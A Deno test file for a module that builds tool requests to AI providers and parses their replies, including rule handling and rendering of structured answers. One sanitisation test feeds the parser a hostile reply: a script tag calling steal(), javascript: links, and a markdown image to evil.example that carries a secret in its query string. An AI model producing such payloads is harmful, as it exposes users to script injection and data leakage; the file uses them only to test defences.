// Run with: deno test --allow-env supabase/functions/_shared/outer-control-tool-request_test.ts
import { buildToolRequest, parseToolReply, structuredToText, renderRules, RESPONSE_CONTRACT, type ToolRequestInput } from "./outer-control-tool-request.ts";

function assert(c: unknown, m: string) { if (!c) throw new Error(m); }
function assertEquals<T>(a: T, b: T, m?: string) { if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error(m ?? `expected ${JSON.stringify(b)}, got ${JSON.stringify(a)}`); }

const base: ToolRequestInput = {
  format: "openai_chat", objective: "Draft a refund policy summary", context: "Customer is on the Pro plan.",
  rules: [{ name: "Refund wording", action: "approval" }, { name: "Project codename", action: "remove_text" }, { name: "Destructive wording", action: "block" }],
  history: [], sessionId: "sess-1", step: 1,
};
const allText = (b: unknown) => JSON.stringify(b);

Deno.test("every format carries the objective, context, each rule with its effect, the contract and the ids", () => {
  for (const format of ["openai_chat", "anthropic_messages", "generic_json"] as const) {
    const { body, headers } = buildToolRequest({ ...base, format });
    const t = allText(body);
    assert(t.includes("Draft a refund policy summary"), `${format}: objective`);
    assert(t.includes("Customer is on the Pro plan."), `${format}: context`);
    assert(t.includes("Refund wording: if matched, a person must approve"), `${format}: approval rule`);
    assert(t.includes("Project codename: if matched, the matching text is removed"), `${format}: remove rule`);
    assert(t.includes("Destructive wording: if matched, the reply is rejected"), `${format}: block rule`);
    assert(t.includes("need_info"), `${format}: contract`);
    assertEquals(headers["X-NazAI-Session"], "sess-1"); assertEquals(headers["X-NazAI-Step"], "1");
  }
});

Deno.test("format shapes match the provider APIs", () => {
  const o = buildToolRequest({ ...base, format: "openai_chat", model: "gpt-x" }).body as any;
  assertEquals(o.model, "gpt-x"); assertEquals(o.messages.map((m: any) => m.role), ["system", "user"]);
  const a = buildToolRequest({ ...base, format: "anthropic_messages" }).body as any;
  assert(typeof a.system === "string" && a.max_tokens > 0 && a.messages[0].role === "user", "anthropic shape");
  // A full answer (up to about 800 words plus the JSON around it) must fit: 1,024 tokens cut one off near 700 words.
  assert(a.max_tokens >= 2048, `anthropic max_tokens is ${a.max_tokens}`);
  const g = buildToolRequest({ ...base, format: "generic_json" }).body as any;
  assertEquals(g.session_id, "sess-1"); assertEquals(g.response_contract, RESPONSE_CONTRACT); assert(Array.isArray(g.rules), "rules array");
});

Deno.test("a later step carries what was accepted, the human's answer, and the correction naming the broken rule", () => {
  const { body } = buildToolRequest({
    ...base, step: 3, history: [{ step: 1, text: "Draft v1" }, { step: 2, text: "Draft v2" }],
    answer: "Use the 30-day window.", correction: "It matched: Destructive wording.",
  });
  const t = allText(body);
  assert(t.includes("Step 1: Draft v1") && t.includes("Step 2: Draft v2"), "history");
  assert(t.includes("A person answered your last question: Use the 30-day window."), "answer");
  assert(t.includes("Your previous reply was rejected. It matched: Destructive wording."), "correction");
  assert(t.includes("This is step 3."), "step number");
});

Deno.test("no custom rules says only built-in checks apply", () => {
  assert(/built-in checks/.test(renderRules([])), "built-in sentence");
});

Deno.test("the request never contains text it was not given (masked context stays masked)", () => {
  const { body } = buildToolRequest({ ...base, context: "key is [REDACTED:secrets]" });
  assert(allText(body).includes("[REDACTED:secrets]"), "placeholder kept");
});

Deno.test("parseToolReply: JSON contract, fenced JSON, plain text, need_info", () => {
  assertEquals(parseToolReply('{"status":"done","answer":"All set."}'), { status: "done", answer: "All set.", question: null, structured: true });
  assertEquals(parseToolReply('```json\n{"status":"continue","answer":"Part 1"}\n```').status, "continue");
  assertEquals(parseToolReply("Just some text."), { status: "done", answer: "Just some text.", question: null, structured: false });
  assertEquals(parseToolReply('{"status":"need_info","answer":"","question":"Which plan?"}'), { status: "need_info", answer: "", question: "Which plan?", structured: true });
  assertEquals(parseToolReply('{"status":"need_info","answer":"Which plan?"}').question, "Which plan?");
});

Deno.test("parseToolReply: JSON that is not the contract is treated as plain text, never dropped", () => {
  const r = parseToolReply('{"foo":1}');
  assertEquals(r.structured, false); assertEquals(r.answer, '{"foo":1}');
  assertEquals(parseToolReply('{"status":"bogus","answer":"x"}').structured, false);
});

Deno.test("parseToolReply: a hostile tool reply is bounded, cleaned and stripped of active content", () => {
  const r = parseToolReply(JSON.stringify({ status: "done", answer: "Hi <script>steal()</script>there [x](javascript:alert(1)) ![p](https://evil.example/a.png?q=secret)\u0000", links: [{ url: "javascript:alert(1)", label: "bad" }, { url: "https://ok.example/a", label: "good" }], extra: "dropped" }));
  if (!r.structured || r.status !== "done") throw new Error("not read");
  if (/script|javascript:|evil\.example|\u0000/.test(r.answer)) throw new Error(r.answer);
  if (!r.answer.includes("good: https://ok.example/a") || r.answer.includes("bad")) throw new Error(r.answer);
  const huge = parseToolReply(JSON.stringify({ status: "done", answer: "x".repeat(500_000) }));
  if (huge.answer.length > 60_000) throw new Error("not cut");
  const unknownStatus = parseToolReply('{"status":"hacked","answer":"a"}');
  if (unknownStatus.structured) throw new Error("an unknown status is plain text");
  const deep = parseToolReply('{"status":"done","answer":"a","x":' + "[".repeat(1000) + "]".repeat(1000) + "}");
  if (deep.structured && deep.answer !== "a") throw new Error("deep");
  const nul = parseToolReply("plain\u0000 text \u202Ehere");
  if (nul.answer !== "plain text here") throw new Error(JSON.stringify(nul.answer));
});

// A tool that sends its answer as JSON (an object or a list) instead of text: the answer is written out as headed text with points,
// so the result shows the findings, not the raw JSON (live research 1937a8fa, 16 Nov 2026).
Deno.test("a structured answer is written out as readable text, not shown as raw JSON", () => {
  const reply = "```json\n" + JSON.stringify({
    status: "done",
    answer: {
      "Key Findings": [
        { Point: "Identify a Specific Niche", Details: "Focus on one niche to reach early adopters.", Certainty: "High" },
        { Point: "Referral Programs", Details: "Offer incentives for referrals.", Certainty: "Medium" },
      ],
      "What this means for you": "With 1 person and 200 EUR a month, use free tools.",
      Assumptions: ["You know AI tools."],
      "Next steps": ["Define your niche.", "Build an MVP in two weeks."],
    },
  }, null, 2) + "\n```";
  const r = parseToolReply(reply);
  if (r.status !== "done" || !r.structured) throw new Error(`status ${r.status} structured ${r.structured}`);
  const want = [
    "KEY FINDINGS\n- Identify a Specific Niche: Focus on one niche to reach early adopters. (Certainty: High)\n- Referral Programs: Offer incentives for referrals. (Certainty: Medium)",
    "WHAT THIS MEANS FOR YOU\nWith 1 person and 200 EUR a month, use free tools.",
    "ASSUMPTIONS\n- You know AI tools.",
    "NEXT STEPS\n- Define your niche.\n- Build an MVP in two weeks.",
  ].join("\n\n");
  if (r.answer !== want) throw new Error(r.answer);
  if (r.answer.includes("{") || r.answer.includes("```")) throw new Error("raw JSON left");
});

Deno.test("only an answer that is an object or a list is written out: other JSON, a text answer and plain text are unchanged", () => {
  const data = JSON.stringify({ summary: "Two options.", options: ["A", "B"] });
  const bare = parseToolReply(data);
  if (bare.structured || bare.answer !== data) throw new Error(`JSON data asked for keeps its JSON: ${bare.answer}`);
  const list = parseToolReply(JSON.stringify({ status: "done", answer: ["Call 5 shops", "Offer a free month"] }));
  if (list.answer !== "- Call 5 shops\n- Offer a free month") throw new Error(list.answer);
  const normal = parseToolReply(JSON.stringify({ status: "done", answer: "Plain words." }));
  if (normal.answer !== "Plain words." || !normal.structured) throw new Error(normal.answer);
  const asking = parseToolReply(JSON.stringify({ status: "need_info", answer: "", question: "Which city?" }));
  if (asking.status !== "need_info" || asking.question !== "Which city?") throw new Error(JSON.stringify(asking));
  const text = parseToolReply("1. One\n2. Two");
  if (text.answer !== "1. One\n2. Two" || text.structured) throw new Error(text.answer);
  if (structuredToText([{ step: "Ship", note: { owner: "me" } }]) !== "- Ship note: me") throw new Error(structuredToText([{ step: "Ship", note: { owner: "me" } }]));
});
